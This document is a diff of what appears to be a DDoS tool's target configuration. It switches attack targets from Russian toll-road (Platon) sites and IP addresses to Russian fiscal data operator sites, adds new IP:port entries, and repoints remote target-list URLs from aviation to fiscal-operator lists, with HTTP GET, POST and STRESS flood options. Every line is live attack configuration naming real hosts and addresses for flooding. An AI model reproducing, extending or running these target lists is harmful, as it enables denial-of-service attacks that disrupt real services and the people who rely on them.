@@ -1,7 +1,6 @@
 #zhnec
 
-https://platon.ru/ru/ https://platon.ru/ru/payments/ https://lk.platon.ru/guest/vehicle_identifications/new?country_id=1001&locale=ru https://lk.platon.ru/sign_in https://lk.platon.ru/guest/vehicle_identifications/new?locale=ru https://lk.platon.ru/registration?locale=ru http://maptiles-5.platon.ru/ https://map.platon.ru/ http://dorogi.platon.ru https://cloud.platon.ru/ --http-methods GET STRESS
-tcp://83.169.194.21:80 tcp://83.169.194.21:443 tcp://83.169.194.22:80 tcp://83.169.194.22:443 tcp://83.169.194.25:80 tcp://83.169.194.25:443 tcp://83.169.194.28:80 tcp://83.169.194.28:443 tcp://83.169.194.30:25 tcp://83.169.194.43:25 tcp://83.169.194.47:80 tcp://83.169.194.48:443
+https://www.1-ofd.ru/ https://k-server.1-ofd.ru/ https://www.taxcom.ru/ https://lk-ofd.taxcom.ru/ https://www.ofd.ru https://www.e-ofd.ru/ https://ofd-magnit.ru/ https://kkttst.ofd-magnit.ru/CheckWebApp/fiscaldocsearch.zul https://www.garantexpress.ru/ https://ofd.kontur.ru/ https://cash-ntt.kontur.ru/ https://ofd.astralnalog.ru/ https://ofd.nvg.ru/home https://kkt.ofd-magnit.ru/CheckWebApp/login.zul https://ofd.beeline.ru/kkt-list https://ofd.esphere.ru/CheckWebApp/login.zul tcp://91.239.5.75:443 tcp://213.87.202.41:443 --http-methods GET STRESS
 
 #gaidamaky
 
@@ -9,6 +8,6 @@ https://home.voice-connect.ru http://home.voice-connect.ru https://my.voice-conn
 -c http://goals.ddosukraine.com.ua/haydamaky/targets_tcp.txt
 
 #ddos separiv
--c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/avia/avia_l7_url --http-methods GET STRESS
--c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/avia/avia_l7_http --http-methods GET STRESS
--c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/avia/avia_l4_tcp
+-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/ofd/ofd_l7_url --http-methods GET POST
+-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/ofd/ofd_l7_http --http-methods GET POST
+-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/ofd/ofd_l4_tcp
